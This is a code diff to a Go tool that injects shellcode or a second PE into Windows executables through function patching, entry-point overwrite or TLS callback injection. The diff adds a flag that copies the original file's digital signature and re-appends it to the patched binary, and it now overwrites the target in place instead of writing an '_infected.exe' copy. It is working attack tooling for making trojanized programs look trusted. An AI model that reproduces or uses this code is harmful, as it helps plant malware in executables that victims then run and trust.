@@ -2,8 +2,10 @@ package main
 
 import (
 	"encoding/binary"
+	"flag"
 	"fmt"
 	"github.com/Binject/debug/pe"
+	"io"
 	"io/ioutil"
 	"log"
 	"os"
@@ -13,23 +15,68 @@ import (
 )
 
 func main() {
-	if len(os.Args) != 4 {
-		fmt.Println("Usage: program function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path>")
+	if len(os.Args) < 4 {
+		fmt.Println("Usage: program [-sign] function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path>")
 		return
 	}
-	mod := os.Args[1]
 
-	modify := os.Args[2]
-	textpath := os.Args[3]
+	// 定义命令行参数
+	sign := flag.Bool("sign", false, "Use signing")
+
+	// 解析命令行参数
+	flag.Parse()
+
+	// 获取非flag参数
+	args := flag.Args()
+	if len(args) < 3 {
+		fmt.Println("Usage: program function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path> [-sign]")
+		return
+	}
+
+	fmt.Println(args)
+
+	mod := args[0]
+	modify := args[1]
+	textpath := args[2]
+
+	var cert []byte
+
+	fmt.Println(*sign)
 
 	switch mod {
 	case "function":
-		execute(modify, textpath)
+		if *sign {
+			fmt.Println("getsign")
+			cert = CopyCert(modify)
+			execute(modify, textpath)
+			WriteCert(cert, modify, modify)
+		} else {
+			execute(modify, textpath)
+			clearcert(modify)
+		}
+
 	case "entrypoint":
-		off := findEntryOff(modify)
-		replaceTextSectionOffset(modify, textpath, uint64(off))
+		if *sign {
+			fmt.Println("getsign")
+			cert = CopyCert(modify)
+			off := findEntryOff(modify)
+			replaceTextSectionOffset(modify, textpath, uint64(off))
+			WriteCert(cert, modify, modify)
+		} else {
+			off := findEntryOff(modify)
+			replaceTextSectionOffset(modify, textpath, uint64(off))
+			clearcert(modify)
+		}
 	case "tlsinject":
-		patchTls(modify, textpath)
+		if *sign {
+			fmt.Println("getsign")
+			cert = CopyCert(modify)
+			patchTls(modify, textpath)
+			WriteCert(cert, modify, modify)
+		} else {
+			clearcert(modify)
+			patchTls(modify, textpath)
+		}
 	default:
 		fmt.Println("wrong mode")
 	}
@@ -272,7 +319,7 @@ func fixUp_SaveExeToFile(bufToSave []byte, pathToWrite string) {
 	}
 }
 
-func patchTls(peFilePath, shellcodePath string) {
+func patchTls(peFilePath, shellcodePath string) string {
 	exeData, err := ioutil.ReadFile(peFilePath)
 	if err != nil {
 		log.Fatalf("Failed to read PE file: %v", err)
@@ -283,12 +330,13 @@ func patchTls(peFilePath, shellcodePath string) {
 		log.Fatalf("Failed to read shellcode file: %v", err)
 	}
 
-	outputPath := peFilePath[:len(peFilePath)-4] + "_infected.exe"
+	outputPath := peFilePath
 	if tlsInject(exeData, shellcode, outputPath) {
 		fmt.Printf("TLS injection successful. Output file: %s\n", outputPath)
 	} else {
 		fmt.Println("TLS injection failed.")
 	}
+	return outputPath
 }
 
 func findEntryOff(pePath string) uint32 {
@@ -678,4 +726,152 @@ func getMemoryMappedImage(peFile *pe.File) ([]byte, error) {
 		copy(image[start:end], data)
 	}
 	return image, nil
+}
+
+func getWord(file *os.File) uint32 {
+	fil := make([]byte, 2)
+	at, err := file.Read(fil)
+	if err != nil || at == 0 {
+		log.Fatal(err.Error())
+	}
+	return uint32(binary.LittleEndian.Uint16(fil))
+
+}
+func getDword(file *os.File) uint32 {
+	fil := make([]byte, 4)
+	at, err := file.Read(fil)
+	if err != nil || at == 0 {
+		log.Fatal(err.Error())
+	}
+	return binary.LittleEndian.Uint32(fil)
+}
+
+func GetPeInfo(path string) (int64, uint32, uint32) {
+
+	file, err := os.Open(path)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	defer file.Close()
+	fmt.Println("[*] Got the File")
+	_, err = file.Seek(0x3c, 0)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	peHeaderLocation := getDword(file)
+	CoffStart := int64(peHeaderLocation) + 4
+	OptionalheaderStart := CoffStart + 20
+	_, err = file.Seek(OptionalheaderStart, 0)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	Magic := getWord(file)
+	_, err = file.Seek(OptionalheaderStart+24, 0)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	//	var imgBase uint64
+	if Magic != 0x20b {
+		file.Seek(4, io.SeekCurrent)
+
+	}
+
+	if Magic != 0x20b {
+		file.Seek(4, io.SeekCurrent)
+		//imgBase = uint64(getDword(file))
+	} else {
+		file.Seek(8, io.SeekCurrent)
+		//imgBase = getQword(file)
+	}
+	position, _ := file.Seek(0, io.SeekCurrent)
+
+	file.Seek(position+40, 0)
+
+	if Magic == 0x20b {
+		file.Seek(32, io.SeekCurrent)
+	} else {
+		file.Seek(16, io.SeekCurrent)
+	}
+
+	CertTableLOC, _ := file.Seek(40, io.SeekCurrent)
+	fmt.Println("[*] Got the CertTable")
+	CertLOC := getDword(file)
+	CertSize := getDword(file)
+
+	return CertTableLOC, CertLOC, CertSize
+}
+
+func CopyCert(path string) []byte {
+	_, CertLOC, CertSize := GetPeInfo(path)
+	if CertSize == 0 || CertLOC == 0 {
+		log.Fatal("[*] Input file Not signed! ")
+	}
+	file, err := os.Open(path)
+	defer file.Close()
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+
+	file.Seek(int64(CertLOC), 0)
+	cert := make([]byte, CertSize)
+	file.Read(cert)
+	fmt.Println("[*] Read the Cert successfully")
+	return cert
+}
+func WriteCert(cert []byte, path string, outputPath string) {
+	CertTableLOC, _, _ := GetPeInfo(path)
+	//	copyFile(path, outputPath)
+	file1, err := os.Open(path)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	file2, err := os.OpenFile(outputPath, os.O_WRONLY|os.O_CREATE, 0755)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	defer file2.Close()
+	defer file1.Close()
+
+	file1Info, err := os.Stat(path)
+	file1Len := file1Info.Size()
+	file1data := make([]byte, file1Len)
+	file1.Read(file1data)
+	file2.Write(file1data)
+	file2.Seek(CertTableLOC, 0)
+	x := make([]byte, 4)
+	binary.LittleEndian.PutUint32(x, uint32(file1Len))
+	file2.Write(x)
+	bCertLen := make([]byte, 4)
+	binary.LittleEndian.PutUint32(bCertLen, uint32(len(cert)))
+	file2.Write(bCertLen)
+	file2.Seek(0, io.SeekEnd)
+	file2.Write(cert)
+	fmt.Println("[*] Signature appended!")
+}
+
+func clearcert(path string) {
+	CertTableLOC, CertLOC, CertSize := GetPeInfo(path)
+	if CertSize == 0 || CertLOC == 0 {
+		fmt.Println("[*] Input file Not signed! ")
+		return
+	}
+
+	file, err := os.OpenFile(path, os.O_RDWR, 0644)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	defer file.Close()
+
+	// 将证书表的位置和大小设置为 0
+	file.Seek(CertTableLOC, 0)
+	zero := make([]byte, 8)
+	file.Write(zero)
+
+	// 将原本的证书位置填充 0x00
+	file.Seek(int64(CertLOC), 0)
+	emptyCert := make([]byte, CertSize)
+	file.Write(emptyCert)
+
+	fmt.Println("[*] Signature cleared successfully")
 }
